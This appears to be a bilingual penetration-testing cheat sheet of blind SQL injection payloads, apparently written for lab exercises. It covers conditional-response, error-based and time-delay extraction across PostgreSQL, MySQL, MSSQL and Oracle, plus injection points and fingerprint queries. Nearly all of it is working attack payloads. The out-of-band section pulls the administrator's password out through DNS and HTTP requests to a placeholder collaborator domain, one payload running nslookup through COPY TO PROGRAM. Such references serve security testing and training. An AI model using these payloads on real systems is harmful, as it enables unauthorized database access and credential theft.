# Blind SQL Injection - Payload Reference

## 条件响应 (Conditional Responses)

```sql
' AND 1=1--                    # True condition (check for "Welcome back")
' AND 1=2--                    # False condition
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--  # Extract char by char
```

## 条件错误 (Conditional Errors) - Oracle

```sql
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--  # True → 500 error
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--  # False → 200 OK
' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--  # Extract data
```

## 可见错误 (Visible Error-Based) - PostgreSQL

```sql
CAST((SELECT MIN(password) FROM users) AS int)  # Error message leaks password value
```

## 时间延迟 (Time Delays)

```sql
-- PostgreSQL
' || pg_sleep(10)--
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--

-- MySQL
' AND SLEEP(10)--
' AND IF(1=1, SLEEP(10), 0)--

-- MSSQL
'; WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)--
```

## 时间延迟 + 信息提取

```sql
-- PostgreSQL: Extract password char by char
' || (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

## OOB (Out-of-Band)

```sql
-- Oracle DNS
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('BURP_COLLAB_DOMAIN') FROM dual--
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator')||'.BURP_COLLAB_DOMAIN') FROM dual--

-- Oracle HTTP
' UNION SELECT UTL_HTTP.REQUEST('http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP_COLLAB_DOMAIN/') FROM dual--

-- MSSQL DNS (password in subdomain)
'; exec master..xp_dirtree '\\'+(SELECT password FROM users WHERE username='administrator')+'.BURP_COLLAB_DOMAIN\a'--

-- PostgreSQL (requires superuser)
'; COPY (SELECT password FROM users) TO PROGRAM('nslookup '||(SELECT password FROM users WHERE username='administrator')||'.BURP_COLLAB_DOMAIN')--
```

## 注入点

| 位置 | 方法 | 示例 |
|------|------|------|
| URL 参数 | GET | `/filter?category=Gifts' UNION SELECT...` |
| Cookie | Header | `Cookie: TrackingId=xxx' AND 1=1--` |
| POST body | POST | `username=admin' OR 1=1--&password=x` |
| Referer/Header | Header | `Referer: ' AND 1=1--` |

## 数据库指纹

| DB | Version Query | Comment |
|----|--------------|---------|
| PostgreSQL | `SELECT version()` | `--` for comments |
| MySQL | `SELECT @@version` | `--` or `#` for comments |
| Oracle | `SELECT BANNER FROM v$version` | `--` for comments |
| MSSQL | `SELECT @@version` | `--` for comments |
